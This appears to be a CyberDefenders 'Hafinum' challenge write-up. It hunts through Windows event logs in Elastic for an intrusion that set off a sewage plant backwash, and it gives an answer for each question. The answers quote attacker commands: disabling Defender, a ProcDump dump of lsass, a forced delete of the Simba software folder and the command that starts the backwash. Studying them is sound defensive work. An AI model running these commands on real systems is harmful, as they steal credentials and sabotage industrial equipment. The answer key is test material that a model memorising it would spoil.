# Hafinum

Elastic is used for this challenge

## 1. What is the name of the threat detected by Windows Defender?

Filter: winlog.event_id:"1116" or winlog.event_id:"1117" (Question 1 and 2)

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/38059d9c-725d-4dfc-9271-13132d2c3f81)

Flag 1: `Trojan:Win32/Ceprolad.A`

## 2. What was the full URL that Windows Defender blocked an archive from being downloaded?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/32c77dbc-4c39-4731-a147-eb037e6f5b07)

Flag 2: `https://download.sysinternals.com/files/Procdump.zip`

## 3. What was the full command used by the attacker to successfully download the archive?

Filter: winlog.event_id:"1" and winlog.event_data.CommandLine : *procdump.zip*  (Question 3 and 4)

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/4db4b40a-a903-4e15-8277-df488783ce3e)

Flag 3: `certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/Procdump.zip" procdump.zip`

## 4. Which user account was the attacker using when the archive was successfully downloaded to the host?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/e2f28bb4-a25e-429c-ad8f-8f1dc6ee12b9)

Flag 4: `Administrator`

## 5. What command was used by the attacker on the host to try and disable Windows Defender via the command line?

Filter: winlog.event_data.ParentCommandLine : *cmd.exe* and winlog.event_id:"1" 

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/f022905b-27bc-424b-8301-ce7bf2e4634b)

Flag 5: `sc stop WinDefend`

## 6. Provide the date and time when Windows Defender's real-time protection was disabled. (24H-UTC)

Filter: winlog.event_id:13 and winlog.event_data.TargetObject:*Real*

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/71d212f0-51d2-4696-b4ed-10cc26d34c7e)

Flag 6: `2021-03-12 08:21:35`

## 7. Which version of ProcDump did the attacker run on the host?

Filter: winlog.event_data.TargetObject : *procdump*

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/80f4f5f8-cff6-4179-afe8-06da9af6e25d)

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/7c3ecce8-4a71-44bd-8ae2-68c5f08f7b46)

Flag 7: `10.0`

## 8. Where is the executable located on the disk that was targeted by Procdump to dump its process memory?

Filter: winlog.event_data.OriginalFileName:lsass.exe

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/c9cec157-b006-46b4-9b5f-1d8190e1a0e5)

Flag 8: `C:\windows\System32\lsass.exe`

## 9. What was the location of the dump file created from the process dumped with Procdump?

Filter:  winlog.event_data.ParentCommandLine:"C:\windows\system32\cmd.exe" and winlog.event_id:1 and winlog.event_data.CommandLine:*lsass.exe*

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/b3337f8e-74e9-4b51-ab1b-7250b2ab292a)

Flag 9: `C:\tmp\lsass.dmp`

## 10. Provide the SHA256 hash value of the Teamviewer installation to check if the legitimate version was installed.

 Filter: winlog.event_data.Image:*TeamViewer* and  winlog.event_id:"1" 

 ![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/8ea58525-c8f7-4833-996f-804622d0e208)

Flag 10: `D256F177A3DD8E7346B3FA9D32C4690B611F104E7CE175E99C5757BE6EEF229B`

## 11. What was the domain looked up in the first DNS query done by the TeamViewer application after it was installed?

Filter: winlog.event_data.Image:*TeamViewer* and winlog.event_id:"22" 

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/ed53c3cc-dd22-436c-a9dc-efcd9c870bb9)

Flag 11: `router7.viewer.com`

## 12. Determine how the attacker gained access to the Administrator account.

Filter: winlog.event_id:"4624" or winlog.event_id:"4625" (For Question 12 and 13)

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/3ff91b0a-cd6c-4950-90b6-895469a1f6cf)

Flag 12: `Brute-Force Attack`

## 13. What IP address can we send to the Firewall team for blocking?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/559d282f-f949-42b9-8219-8507c7acddbd)

Flag 13: `8.36.216.58`

## 14. What was the hostname from where the attacker launched their attack?

Filter: winlog.event_id:"4625" or winlog.event_id:"4624" and winlog.event_data.WorkstationName : * 

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/7a311875-04c2-47b3-ae50-77b3077705ae)

Flag 14: `FancyPoodle`

## 15. Provide the first timestamp from the logs where you can see the attacker was successful login. (24H-UTC)

Filter: winlog.event_id:"4624" and winlog.event_data.IpAddress : "8.36.216.58" and winlog.event_data.WorkstationName : "FancyPoodle" 

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/ded1ad72-2a08-41c7-b35f-3bdb670294f5)

Flag 15: `2021-03-11 20:26:52` (UTC)

## 16. Provide the data in UTC time of when the attacker successfully logged into the host using RDP for the first time. (24H-UTC)

Filter: winlog.event_id:"23"

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/aad1ffd0-e53c-404e-9e6a-2a33447e9836)

Flag 16: `2021-03-12 08:03:02` (UTC)

## 17. When did the attacker log off from the first RDP session? (24H-UTC)

Filter: winlog.event_id:"23" and winlog.user_data.user:POOPCONTROLLER\Administrator

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/c2e7154e-5086-4f9a-969d-2cad350251aa)

Flag 17: `2021-03-12 08:45:02`

## 18. What command did the attacker run on the host which would've helped him understand what Antivirus software was running on the system?

Filter: winlog.event_data.ParentCommandLine : *cmd.exe* and winlog.event_id:"1"  and winlog.event_data.User:POOPCONTROLLER\Administrator (From question 18 to 20)

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/4ee09919-26c1-452a-a050-9b1f1f6e986b)

Flag 18: `tasklist`

## 19. Which command did the attacker run on the host that would have helped him understand the network interface configuration of the host?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/bb0d60b4-584b-455f-b707-2381dff83ea8)

Flag 19: `ipconfig /all`

## 20. What was the name of the user account added by the attacker?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/ffbcc596-3205-4581-8c7c-b15bbaf189bb)

Flag 20: `Administrator1`

## 21. Based on information from the public, the first visual signs of raw sewage spilling into the river from the plant were around 14:00 local time on March 12th, 2021. According to the plant technicians, it would take at least 45 minutes for the plant to excrete sewage into the river once the backwash mode was activated. A file was created on the system that matches the above timelines and, based on its content, could likely have been used by the attackers to initiate the plant backwash. What was the name of this file?

Filter: winlog.event_id:"15" (From question 21 to 25)

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/42667aad-3d44-473e-99df-cd6ed3499a5d)

Flag 21: `backwash.bat`

## 22. Which application was responsible for downloading the malicious file to the host?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/c0c9518b-9de5-435c-b05e-cd92865cedbb)

Flag 22: `chrome.exe`

## 23. From which website was this malicious file downloaded?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/0cb2228c-0d27-4c7b-9d6c-292ce2b033d5)

Flag 23: `wetransfer.com`

## 24. After this file was downloaded, the attacker appeared to have moved it to another directory on the host. What was the new path of the file?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/f87ad300-1824-4d8f-9ee5-dfb68a68420c)

Flag 24: `C:\backwash.bat`

## 25. Based on the available logs, there are limited indications that the downloaded malicious file was executed on the host. Provide the earliest timestamp which shows proof of the file being executed on the host. (24H-UTC)

The malicious file contains timeout command
![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/cb10579e-014a-4fac-b10f-bc71754b4d64)

Going back to winlog.event_id:"1" and winlog.event_data.ParentCommandLine: *cmd.exe*
![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/d25b5baa-943f-4280-9ea2-5232a3d8bdb3)
![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/09266e2b-07cb-40bc-8915-55336f104d8e)

Flag 25: `2021-03-12 11:10:03`

## 26. What command contained in the malicious file, if successfully run on the host, would you expect to have initiated the plant’s backwash mode

Filter: winlog.event_id:"15" (from question 21)

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/8abdf4e8-620a-4be0-acfb-a2f25f8a8a7a)

Flag 26: `C:\Program Files\ifak\SIMBA#4.3\Simba.exe --function backwash --interruptable no`

## 27. Prior to switching to a manual override, the technicians attempted to open the modified Simba plant simulation software application in order to stop the backwash sequence. However, they could not get the application to launch. What command from the attacker's script would have rendered the application unusable?

Filter: winlog.event_id:"15" (from question 21)

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/123d49bd-0500-4fc9-b771-5eb4d49f6919)

Flag 27: `DEL /F /Q "C:\Program Files\ifak\SIMBA#4.3\*"`











































